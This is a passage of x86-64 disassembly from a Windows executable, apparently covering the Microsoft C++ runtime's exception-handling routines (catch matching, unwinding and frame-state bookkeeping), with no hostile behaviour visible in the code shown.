   140003a34:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140003a39:	4c 8b 77 28          	mov    0x28(%rdi),%r14
   140003a3d:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   140003a42:	48 8b cb             	mov    %rbx,%rcx
   140003a45:	e8 6a e4 ff ff       	call   0x140001eb4
   140003a4a:	e8 bd e4 ff ff       	call   0x140001f0c
   140003a4f:	48 89 70 20          	mov    %rsi,0x20(%rax)
   140003a53:	e8 b4 e4 ff ff       	call   0x140001f0c
   140003a58:	48 89 58 28          	mov    %rbx,0x28(%rax)
   140003a5c:	e8 ab e4 ff ff       	call   0x140001f0c
   140003a61:	48 8b 50 20          	mov    0x20(%rax),%rdx
   140003a65:	48 8b 52 28          	mov    0x28(%rdx),%rdx
   140003a69:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003a6e:	e8 91 ed ff ff       	call   0x140002804
   140003a73:	4c 8b e0             	mov    %rax,%r12
   140003a76:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003a7b:	4c 39 7f 58          	cmp    %r15,0x58(%rdi)
   140003a7f:	74 1c                	je     0x140003a9d
   140003a81:	c7 84 24 b0 00 00 00 	movl   $0x1,0xb0(%rsp)
   140003a88:	01 00 00 00 
   140003a8c:	e8 7b e4 ff ff       	call   0x140001f0c
   140003a91:	48 8b 48 70          	mov    0x70(%rax),%rcx
   140003a95:	48 89 8c 24 c8 00 00 	mov    %rcx,0xc8(%rsp)
   140003a9c:	00 
   140003a9d:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140003aa3:	49 8b d6             	mov    %r14,%rdx
   140003aa6:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003aab:	e8 a0 05 00 00       	call   0x140004050
   140003ab0:	48 8b d8             	mov    %rax,%rbx
   140003ab3:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003ab8:	48 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%rdi
   140003abf:	00 
   140003ac0:	eb 78                	jmp    0x140003b3a
   140003ac2:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140003ac9:	00 
   140003aca:	e8 3d e4 ff ff       	call   0x140001f0c
   140003acf:	83 60 40 00          	andl   $0x0,0x40(%rax)
   140003ad3:	48 8b b4 24 b8 00 00 	mov    0xb8(%rsp),%rsi
   140003ada:	00 
   140003adb:	83 bc 24 b0 00 00 00 	cmpl   $0x0,0xb0(%rsp)
   140003ae2:	00 
   140003ae3:	74 21                	je     0x140003b06
   140003ae5:	b2 01                	mov    $0x1,%dl
   140003ae7:	48 8b ce             	mov    %rsi,%rcx
   140003aea:	e8 f5 e1 ff ff       	call   0x140001ce4
   140003aef:	48 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%rcx
   140003af6:	00 
   140003af7:	4c 8d 49 20          	lea    0x20(%rcx),%r9
   140003afb:	44 8b 41 18          	mov    0x18(%rcx),%r8d
   140003aff:	8b 51 04             	mov    0x4(%rcx),%edx
   140003b02:	8b 09                	mov    (%rcx),%ecx
   140003b04:	eb 0d                	jmp    0x140003b13
   140003b06:	4c 8d 4e 20          	lea    0x20(%rsi),%r9
   140003b0a:	44 8b 46 18          	mov    0x18(%rsi),%r8d
   140003b0e:	8b 56 04             	mov    0x4(%rsi),%edx
   140003b11:	8b 0e                	mov    (%rsi),%ecx
   140003b13:	ff 15 e7 b5 00 00    	call   *0xb5e7(%rip)        # 0x14000f100
   140003b19:	44 8b 7c 24 20       	mov    0x20(%rsp),%r15d
   140003b1e:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140003b23:	4c 8b 6c 24 40       	mov    0x40(%rsp),%r13
   140003b28:	48 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%rdi
   140003b2f:	00 
   140003b30:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   140003b35:	4c 8b 64 24 38       	mov    0x38(%rsp),%r12
   140003b3a:	49 8b cc             	mov    %r12,%rcx
   140003b3d:	e8 fe ec ff ff       	call   0x140002840
   140003b42:	45 85 ff             	test   %r15d,%r15d
   140003b45:	75 32                	jne    0x140003b79
   140003b47:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%rsi)
   140003b4d:	75 2a                	jne    0x140003b79
   140003b4f:	83 7e 18 04          	cmpl   $0x4,0x18(%rsi)
   140003b53:	75 24                	jne    0x140003b79
   140003b55:	8b 46 20             	mov    0x20(%rsi),%eax
   140003b58:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140003b5d:	83 f8 02             	cmp    $0x2,%eax
   140003b60:	77 17                	ja     0x140003b79
   140003b62:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
   140003b66:	e8 ed e1 ff ff       	call   0x140001d58
   140003b6b:	85 c0                	test   %eax,%eax
   140003b6d:	74 0a                	je     0x140003b79
   140003b6f:	b2 01                	mov    $0x1,%dl
   140003b71:	48 8b ce             	mov    %rsi,%rcx
   140003b74:	e8 6b e1 ff ff       	call   0x140001ce4
   140003b79:	e8 8e e3 ff ff       	call   0x140001f0c
   140003b7e:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140003b82:	e8 85 e3 ff ff       	call   0x140001f0c
   140003b87:	4c 89 68 28          	mov    %r13,0x28(%rax)
   140003b8b:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140003b90:	48 63 48 1c          	movslq 0x1c(%rax),%rcx
   140003b94:	49 8b 06             	mov    (%r14),%rax
   140003b97:	48 c7 04 01 fe ff ff 	movq   $0xfffffffffffffffe,(%rcx,%rax,1)
   140003b9e:	ff 
   140003b9f:	48 8b c3             	mov    %rbx,%rax
   140003ba2:	48 83 c4 70          	add    $0x70,%rsp
   140003ba6:	41 5f                	pop    %r15
   140003ba8:	41 5e                	pop    %r14
   140003baa:	41 5d                	pop    %r13
   140003bac:	41 5c                	pop    %r12
   140003bae:	5f                   	pop    %rdi
   140003baf:	5e                   	pop    %rsi
   140003bb0:	5b                   	pop    %rbx
   140003bb1:	c3                   	ret
   140003bb2:	cc                   	int3
   140003bb3:	cc                   	int3
   140003bb4:	40 53                	rex push %rbx
   140003bb6:	48 83 ec 20          	sub    $0x20,%rsp
   140003bba:	4c 8b 09             	mov    (%rcx),%r9
   140003bbd:	49 8b d8             	mov    %r8,%rbx
   140003bc0:	41 83 20 00          	andl   $0x0,(%r8)
   140003bc4:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   140003bc9:	41 39 09             	cmp    %ecx,(%r9)
   140003bcc:	75 61                	jne    0x140003c2f
   140003bce:	41 83 79 18 04       	cmpl   $0x4,0x18(%r9)
   140003bd3:	41 b8 20 05 93 19    	mov    $0x19930520,%r8d
   140003bd9:	75 1c                	jne    0x140003bf7
   140003bdb:	41 8b 41 20          	mov    0x20(%r9),%eax
   140003bdf:	41 2b c0             	sub    %r8d,%eax
   140003be2:	83 f8 02             	cmp    $0x2,%eax
   140003be5:	77 10                	ja     0x140003bf7
   140003be7:	48 8b 42 28          	mov    0x28(%rdx),%rax
   140003beb:	49 39 41 28          	cmp    %rax,0x28(%r9)
   140003bef:	75 06                	jne    0x140003bf7
   140003bf1:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   140003bf7:	41 39 09             	cmp    %ecx,(%r9)
   140003bfa:	75 33                	jne    0x140003c2f
   140003bfc:	41 83 79 18 04       	cmpl   $0x4,0x18(%r9)
   140003c01:	75 2c                	jne    0x140003c2f
   140003c03:	41 8b 49 20          	mov    0x20(%r9),%ecx
   140003c07:	41 2b c8             	sub    %r8d,%ecx
   140003c0a:	83 f9 02             	cmp    $0x2,%ecx
   140003c0d:	77 20                	ja     0x140003c2f
   140003c0f:	49 83 79 30 00       	cmpq   $0x0,0x30(%r9)
   140003c14:	75 19                	jne    0x140003c2f
   140003c16:	e8 f1 e2 ff ff       	call   0x140001f0c
   140003c1b:	c7 40 40 01 00 00 00 	movl   $0x1,0x40(%rax)
   140003c22:	b8 01 00 00 00       	mov    $0x1,%eax
   140003c27:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   140003c2d:	eb 02                	jmp    0x140003c31
   140003c2f:	33 c0                	xor    %eax,%eax
   140003c31:	48 83 c4 20          	add    $0x20,%rsp
   140003c35:	5b                   	pop    %rbx
   140003c36:	c3                   	ret
   140003c37:	cc                   	int3
   140003c38:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   140003c3d:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140003c42:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140003c47:	53                   	push   %rbx
   140003c48:	56                   	push   %rsi
   140003c49:	57                   	push   %rdi
   140003c4a:	41 54                	push   %r12
   140003c4c:	41 55                	push   %r13
   140003c4e:	41 56                	push   %r14
   140003c50:	41 57                	push   %r15
   140003c52:	48 83 ec 30          	sub    $0x30,%rsp
   140003c56:	45 8b e1             	mov    %r9d,%r12d
   140003c59:	49 8b f0             	mov    %r8,%rsi
   140003c5c:	48 8b da             	mov    %rdx,%rbx
   140003c5f:	4c 8b f9             	mov    %rcx,%r15
   140003c62:	e8 2d ec ff ff       	call   0x140002894
   140003c67:	4c 8b e8             	mov    %rax,%r13
   140003c6a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003c6f:	4c 8b c6             	mov    %rsi,%r8
   140003c72:	48 8b d3             	mov    %rbx,%rdx
   140003c75:	49 8b cf             	mov    %r15,%rcx
   140003c78:	e8 03 ed ff ff       	call   0x140002980
   140003c7d:	8b f8                	mov    %eax,%edi
   140003c7f:	e8 88 e2 ff ff       	call   0x140001f0c
   140003c84:	ff 40 30             	incl   0x30(%rax)
   140003c87:	83 ff ff             	cmp    $0xffffffff,%edi
   140003c8a:	0f 84 eb 00 00 00    	je     0x140003d7b
   140003c90:	41 3b fc             	cmp    %r12d,%edi
   140003c93:	0f 8e e2 00 00 00    	jle    0x140003d7b
   140003c99:	83 ff ff             	cmp    $0xffffffff,%edi
   140003c9c:	0f 8e 14 01 00 00    	jle    0x140003db6
   140003ca2:	3b 7e 04             	cmp    0x4(%rsi),%edi
   140003ca5:	0f 8d 0b 01 00 00    	jge    0x140003db6
   140003cab:	4c 63 f7             	movslq %edi,%r14
   140003cae:	e8 e1 eb ff ff       	call   0x140002894
   140003cb3:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   140003cb7:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   140003cbb:	8b 3c 01             	mov    (%rcx,%rax,1),%edi
   140003cbe:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140003cc2:	e8 cd eb ff ff       	call   0x140002894
   140003cc7:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   140003ccb:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   140003ccf:	83 7c 01 04 00       	cmpl   $0x0,0x4(%rcx,%rax,1)
   140003cd4:	74 1c                	je     0x140003cf2
   140003cd6:	e8 b9 eb ff ff       	call   0x140002894
   140003cdb:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   140003cdf:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   140003ce3:	48 63 5c 01 04       	movslq 0x4(%rcx,%rax,1),%rbx
   140003ce8:	e8 a7 eb ff ff       	call   0x140002894
   140003ced:	48 03 c3             	add    %rbx,%rax
   140003cf0:	eb 02                	jmp    0x140003cf4
   140003cf2:	33 c0                	xor    %eax,%eax
   140003cf4:	48 85 c0             	test   %rax,%rax
   140003cf7:	74 59                	je     0x140003d52
   140003cf9:	44 8b c7             	mov    %edi,%r8d
   140003cfc:	48 8b d6             	mov    %rsi,%rdx
   140003cff:	49 8b cf             	mov    %r15,%rcx
   140003d02:	e8 cd ec ff ff       	call   0x1400029d4
   140003d07:	e8 88 eb ff ff       	call   0x140002894
   140003d0c:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   140003d10:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   140003d14:	83 7c 01 04 00       	cmpl   $0x0,0x4(%rcx,%rax,1)
   140003d19:	74 1c                	je     0x140003d37
   140003d1b:	e8 74 eb ff ff       	call   0x140002894
   140003d20:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   140003d24:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   140003d28:	48 63 5c 01 04       	movslq 0x4(%rcx,%rax,1),%rbx
   140003d2d:	e8 62 eb ff ff       	call   0x140002894
   140003d32:	48 03 c3             	add    %rbx,%rax
   140003d35:	eb 02                	jmp    0x140003d39
   140003d37:	33 c0                	xor    %eax,%eax
   140003d39:	41 b8 03 01 00 00    	mov    $0x103,%r8d
   140003d3f:	49 8b d7             	mov    %r15,%rdx
   140003d42:	48 8b c8             	mov    %rax,%rcx
   140003d45:	e8 06 03 00 00       	call   0x140004050
   140003d4a:	49 8b cd             	mov    %r13,%rcx
   140003d4d:	e8 6a eb ff ff       	call   0x1400028bc
   140003d52:	eb 1e                	jmp    0x140003d72
   140003d54:	44 8b a4 24 88 00 00 	mov    0x88(%rsp),%r12d
   140003d5b:	00 
   140003d5c:	48 8b b4 24 80 00 00 	mov    0x80(%rsp),%rsi
   140003d63:	00 
   140003d64:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
   140003d69:	4c 8b 6c 24 28       	mov    0x28(%rsp),%r13
   140003d6e:	8b 7c 24 20          	mov    0x20(%rsp),%edi
   140003d72:	89 7c 24 24          	mov    %edi,0x24(%rsp)
   140003d76:	e9 0c ff ff ff       	jmp    0x140003c87
   140003d7b:	e8 8c e1 ff ff       	call   0x140001f0c
   140003d80:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   140003d84:	7e 08                	jle    0x140003d8e
   140003d86:	e8 81 e1 ff ff       	call   0x140001f0c
   140003d8b:	ff 48 30             	decl   0x30(%rax)
   140003d8e:	83 ff ff             	cmp    $0xffffffff,%edi
   140003d91:	74 05                	je     0x140003d98
   140003d93:	41 3b fc             	cmp    %r12d,%edi
   140003d96:	7f 24                	jg     0x140003dbc
   140003d98:	44 8b c7             	mov    %edi,%r8d
   140003d9b:	48 8b d6             	mov    %rsi,%rdx
   140003d9e:	49 8b cf             	mov    %r15,%rcx
   140003da1:	e8 2e ec ff ff       	call   0x1400029d4
   140003da6:	48 83 c4 30          	add    $0x30,%rsp
   140003daa:	41 5f                	pop    %r15
   140003dac:	41 5e                	pop    %r14
   140003dae:	41 5d                	pop    %r13
   140003db0:	41 5c                	pop    %r12
   140003db2:	5f                   	pop    %rdi
   140003db3:	5e                   	pop    %rsi
   140003db4:	5b                   	pop    %rbx
   140003db5:	c3                   	ret
   140003db6:	e8 cd 27 00 00       	call   0x140006588
   140003dbb:	90                   	nop
   140003dbc:	e8 c7 27 00 00       	call   0x140006588
   140003dc1:	90                   	nop
   140003dc2:	cc                   	int3
   140003dc3:	cc                   	int3
   140003dc4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003dc9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003dce:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003dd3:	57                   	push   %rdi
   140003dd4:	48 83 ec 20          	sub    $0x20,%rsp
   140003dd8:	48 8b e9             	mov    %rcx,%rbp
   140003ddb:	49 8b f8             	mov    %r8,%rdi
   140003dde:	49 8b c8             	mov    %r8,%rcx
   140003de1:	48 8b f2             	mov    %rdx,%rsi
   140003de4:	e8 33 ec ff ff       	call   0x140002a1c
   140003de9:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140003dee:	4c 8b c7             	mov    %rdi,%r8
   140003df1:	48 8b d6             	mov    %rsi,%rdx
   140003df4:	48 8b cd             	mov    %rbp,%rcx
   140003df7:	8b d8                	mov    %eax,%ebx
   140003df9:	e8 fe e6 ff ff       	call   0x1400024fc
   140003dfe:	4c 8b c7             	mov    %rdi,%r8
   140003e01:	48 8b d6             	mov    %rsi,%rdx
   140003e04:	48 8b cd             	mov    %rbp,%rcx
   140003e07:	e8 9c eb ff ff       	call   0x1400029a8
   140003e0c:	3b d8                	cmp    %eax,%ebx
   140003e0e:	7e 23                	jle    0x140003e33
   140003e10:	44 8b c3             	mov    %ebx,%r8d
   140003e13:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140003e18:	48 8b d7             	mov    %rdi,%rdx
   140003e1b:	e8 b4 eb ff ff       	call   0x1400029d4
   140003e20:	44 8b cb             	mov    %ebx,%r9d
   140003e23:	4c 8b c7             	mov    %rdi,%r8
   140003e26:	48 8b d6             	mov    %rsi,%rdx
   140003e29:	48 8b cd             	mov    %rbp,%rcx
   140003e2c:	e8 af eb ff ff       	call   0x1400029e0
   140003e31:	eb 10                	jmp    0x140003e43
   140003e33:	4c 8b c7             	mov    %rdi,%r8
   140003e36:	48 8b d6             	mov    %rsi,%rdx
   140003e39:	48 8b cd             	mov    %rbp,%rcx
   140003e3c:	e8 67 eb ff ff       	call   0x1400029a8
   140003e41:	8b d8                	mov    %eax,%ebx
   140003e43:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003e48:	8b c3                	mov    %ebx,%eax
   140003e4a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003e4f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003e54:	48 83 c4 20          	add    $0x20,%rsp
   140003e58:	5f                   	pop    %rdi
   140003e59:	c3                   	ret
   140003e5a:	cc                   	int3
   140003e5b:	cc                   	int3
   140003e5c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003e61:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140003e66:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003e6b:	57                   	push   %rdi
   140003e6c:	41 54                	push   %r12
   140003e6e:	41 55                	push   %r13
   140003e70:	41 56                	push   %r14
   140003e72:	41 57                	push   %r15
   140003e74:	48 83 ec 20          	sub    $0x20,%rsp
   140003e78:	48 8b ea             	mov    %rdx,%rbp
   140003e7b:	4c 8b e9             	mov    %rcx,%r13
   140003e7e:	48 85 d2             	test   %rdx,%rdx
   140003e81:	0f 84 bc 00 00 00    	je     0x140003f43
   140003e87:	45 32 ff             	xor    %r15b,%r15b
   140003e8a:	33 f6                	xor    %esi,%esi
   140003e8c:	39 32                	cmp    %esi,(%rdx)
   140003e8e:	0f 8e 8f 00 00 00    	jle    0x140003f23
   140003e94:	e8 0f ea ff ff       	call   0x1400028a8
   140003e99:	48 8b d0             	mov    %rax,%rdx
   140003e9c:	49 8b 45 30          	mov    0x30(%r13),%rax
   140003ea0:	4c 63 60 0c          	movslq 0xc(%rax),%r12
   140003ea4:	49 83 c4 04          	add    $0x4,%r12
   140003ea8:	4c 03 e2             	add    %rdx,%r12
   140003eab:	e8 f8 e9 ff ff       	call   0x1400028a8
   140003eb0:	48 8b d0             	mov    %rax,%rdx
   140003eb3:	49 8b 45 30          	mov    0x30(%r13),%rax
   140003eb7:	48 63 48 0c          	movslq 0xc(%rax),%rcx
   140003ebb:	44 8b 34 0a          	mov    (%rdx,%rcx,1),%r14d
   140003ebf:	45 85 f6             	test   %r14d,%r14d
   140003ec2:	7e 54                	jle    0x140003f18
   140003ec4:	48 63 c6             	movslq %esi,%rax
   140003ec7:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140003ecb:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140003ed0:	e8 d3 e9 ff ff       	call   0x1400028a8
   140003ed5:	49 8b 5d 30          	mov    0x30(%r13),%rbx
   140003ed9:	48 8b f8             	mov    %rax,%rdi
   140003edc:	49 63 04 24          	movslq (%r12),%rax
   140003ee0:	48 03 f8             	add    %rax,%rdi
   140003ee3:	e8 ac e9 ff ff       	call   0x140002894
   140003ee8:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   140003eed:	4c 8b c3             	mov    %rbx,%r8
   140003ef0:	48 63 4d 04          	movslq 0x4(%rbp),%rcx
   140003ef4:	48 8d 04 90          	lea    (%rax,%rdx,4),%rax
   140003ef8:	48 8b d7             	mov    %rdi,%rdx
   140003efb:	48 03 c8             	add    %rax,%rcx
   140003efe:	e8 5d f6 ff ff       	call   0x140003560
   140003f03:	85 c0                	test   %eax,%eax
   140003f05:	75 0e                	jne    0x140003f15
   140003f07:	41 ff ce             	dec    %r14d
   140003f0a:	49 83 c4 04          	add    $0x4,%r12
   140003f0e:	45 85 f6             	test   %r14d,%r14d
   140003f11:	7f bd                	jg     0x140003ed0
   140003f13:	eb 03                	jmp    0x140003f18
   140003f15:	41 b7 01             	mov    $0x1,%r15b
   140003f18:	ff c6                	inc    %esi
   140003f1a:	3b 75 00             	cmp    0x0(%rbp),%esi
   140003f1d:	0f 8c 71 ff ff ff    	jl     0x140003e94
   140003f23:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140003f28:	41 8a c7             	mov    %r15b,%al
   140003f2b:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140003f30:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140003f35:	48 83 c4 20          	add    $0x20,%rsp
   140003f39:	41 5f                	pop    %r15
   140003f3b:	41 5e                	pop    %r14
   140003f3d:	41 5d                	pop    %r13
   140003f3f:	41 5c                	pop    %r12
   140003f41:	5f                   	pop    %rdi
   140003f42:	c3                   	ret
   140003f43:	e8 40 26 00 00       	call   0x140006588
   140003f48:	cc                   	int3
   140003f49:	cc                   	int3
   140003f4a:	cc                   	int3
   140003f4b:	cc                   	int3
   140003f4c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003f51:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003f56:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003f5b:	57                   	push   %rdi
   140003f5c:	48 83 ec 20          	sub    $0x20,%rsp
   140003f60:	33 ed                	xor    %ebp,%ebp
   140003f62:	48 8b f9             	mov    %rcx,%rdi
   140003f65:	39 29                	cmp    %ebp,(%rcx)
   140003f67:	7e 50                	jle    0x140003fb9
   140003f69:	33 f6                	xor    %esi,%esi
   140003f6b:	e8 24 e9 ff ff       	call   0x140002894
   140003f70:	48 63 4f 04          	movslq 0x4(%rdi),%rcx
   140003f74:	48 03 c6             	add    %rsi,%rax
   140003f77:	83 7c 01 04 00       	cmpl   $0x0,0x4(%rcx,%rax,1)
   140003f7c:	74 1b                	je     0x140003f99
   140003f7e:	e8 11 e9 ff ff       	call   0x140002894
   140003f83:	48 63 4f 04          	movslq 0x4(%rdi),%rcx
   140003f87:	48 03 c6             	add    %rsi,%rax
   140003f8a:	48 63 5c 01 04       	movslq 0x4(%rcx,%rax,1),%rbx
   140003f8f:	e8 00 e9 ff ff       	call   0x140002894
   140003f94:	48 03 c3             	add    %rbx,%rax
   140003f97:	eb 02                	jmp    0x140003f9b
   140003f99:	33 c0                	xor    %eax,%eax
   140003f9b:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140003f9f:	48 8d 15 c2 5a 01 00 	lea    0x15ac2(%rip),%rdx        # 0x140019a68
   140003fa6:	e8 11 dd ff ff       	call   0x140001cbc
   140003fab:	85 c0                	test   %eax,%eax
   140003fad:	74 21                	je     0x140003fd0
   140003faf:	ff c5                	inc    %ebp
   140003fb1:	48 83 c6 14          	add    $0x14,%rsi
   140003fb5:	3b 2f                	cmp    (%rdi),%ebp
   140003fb7:	7c b2                	jl     0x140003f6b
   140003fb9:	32 c0                	xor    %al,%al
   140003fbb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003fc0:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003fc5:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003fca:	48 83 c4 20          	add    $0x20,%rsp
   140003fce:	5f                   	pop    %rdi
   140003fcf:	c3                   	ret
   140003fd0:	b0 01                	mov    $0x1,%al
   140003fd2:	eb e7                	jmp    0x140003fbb
   140003fd4:	48 8b c2             	mov    %rdx,%rax
   140003fd7:	49 8b d0             	mov    %r8,%rdx
   140003fda:	48 ff e0             	rex.W jmp *%rax
   140003fdd:	cc                   	int3
   140003fde:	cc                   	int3
   140003fdf:	cc                   	int3
   140003fe0:	49 8b c0             	mov    %r8,%rax
   140003fe3:	4c 8b d2             	mov    %rdx,%r10
   140003fe6:	48 8b d0             	mov    %rax,%rdx
   140003fe9:	45 8b c1             	mov    %r9d,%r8d
   140003fec:	49 ff e2             	rex.WB jmp *%r10
   140003fef:	cc                   	int3
   140003ff0:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   140003ff5:	48 8d 05 34 c3 00 00 	lea    0xc334(%rip),%rax        # 0x140010330
   140003ffc:	48 0f 45 41 08       	cmovne 0x8(%rcx),%rax
   140004001:	c3                   	ret
   140004002:	cc                   	int3
   140004003:	cc                   	int3
   140004004:	cc                   	int3
   140004005:	cc                   	int3
   140004006:	cc                   	int3
   140004007:	cc                   	int3
   140004008:	cc                   	int3
   140004009:	cc                   	int3
   14000400a:	cc                   	int3
   14000400b:	cc                   	int3
   14000400c:	cc                   	int3
   14000400d:	cc                   	int3
   14000400e:	cc                   	int3
   14000400f:	cc                   	int3
   140004010:	cc                   	int3
   140004011:	cc                   	int3
   140004012:	cc                   	int3
   140004013:	cc                   	int3
   140004014:	cc                   	int3
   140004015:	cc                   	int3
   140004016:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000401d:	00 00 00 
   140004020:	cc                   	int3
   140004021:	cc                   	int3
   140004022:	cc                   	int3
   140004023:	cc                   	int3
   140004024:	cc                   	int3
   140004025:	cc                   	int3
   140004026:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000402d:	00 00 00 
   140004030:	cc                   	int3
   140004031:	cc                   	int3
   140004032:	cc                   	int3
   140004033:	cc                   	int3
   140004034:	cc                   	int3
   140004035:	cc                   	int3
   140004036:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000403d:	00 00 00 
   140004040:	cc                   	int3
   140004041:	cc                   	int3
   140004042:	cc                   	int3
   140004043:	cc                   	int3
   140004044:	cc                   	int3
   140004045:	cc                   	int3
   140004046:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000404d:	00 00 00 
   140004050:	48 83 ec 28          	sub    $0x28,%rsp
   140004054:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140004059:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000405e:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   140004063:	48 8b 12             	mov    (%rdx),%rdx
   140004066:	48 8b c1             	mov    %rcx,%rax
   140004069:	e8 12 de ff ff       	call   0x140001e80
   14000406e:	ff d0                	call   *%rax
   140004070:	e8 3b de ff ff       	call   0x140001eb0
   140004075:	48 8b c8             	mov    %rax,%rcx
   140004078:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   14000407d:	48 8b 12             	mov    (%rdx),%rdx
   140004080:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004086:	e8 f5 dd ff ff       	call   0x140001e80
   14000408b:	48 83 c4 28          	add    $0x28,%rsp
   14000408f:	c3                   	ret
   140004090:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004095:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000409a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000409f:	41 56                	push   %r14
   1400040a1:	48 83 ec 20          	sub    $0x20,%rsp
   1400040a5:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   1400040a9:	4c 8b f2             	mov    %rdx,%r14
   1400040ac:	48 8b f1             	mov    %rcx,%rsi
   1400040af:	74 4c                	je     0x1400040fd
   1400040b1:	48 8b 01             	mov    (%rcx),%rax
   1400040b4:	48 85 c0             	test   %rax,%rax
   1400040b7:	74 44                	je     0x1400040fd
   1400040b9:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   1400040bd:	48 ff c7             	inc    %rdi
   1400040c0:	80 3c 38 00          	cmpb   $0x0,(%rax,%rdi,1)
   1400040c4:	75 f7                	jne    0x1400040bd
   1400040c6:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   1400040ca:	e8 51 24 00 00       	call   0x140006520
   1400040cf:	48 8b d8             	mov    %rax,%rbx
   1400040d2:	48 85 c0             	test   %rax,%rax
   1400040d5:	74 1c                	je     0x1400040f3
   1400040d7:	4c 8b 06             	mov    (%rsi),%r8
   1400040da:	48 8d 57 01          	lea    0x1(%rdi),%rdx
   1400040de:	48 8b c8             	mov    %rax,%rcx
   1400040e1:	e8 42 24 00 00       	call   0x140006528
   1400040e6:	48 8b c3             	mov    %rbx,%rax
   1400040e9:	41 c6 46 08 01       	movb   $0x1,0x8(%r14)
   1400040ee:	49 89 06             	mov    %rax,(%r14)
   1400040f1:	33 db                	xor    %ebx,%ebx
   1400040f3:	48 8b cb             	mov    %rbx,%rcx
   1400040f6:	e8 11 24 00 00       	call   0x14000650c
   1400040fb:	eb 0a                	jmp    0x140004107
   1400040fd:	48 8b 01             	mov    (%rcx),%rax
   140004100:	48 89 02             	mov    %rax,(%rdx)
   140004103:	c6 42 08 00          	movb   $0x0,0x8(%rdx)
   140004107:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000410c:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004111:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140004116:	48 83 c4 20          	add    $0x20,%rsp
   14000411a:	41 5e                	pop    %r14
   14000411c:	c3                   	ret
   14000411d:	cc                   	int3
   14000411e:	cc                   	int3
   14000411f:	cc                   	int3
   140004120:	40 53                	rex push %rbx
   140004122:	48 83 ec 20          	sub    $0x20,%rsp
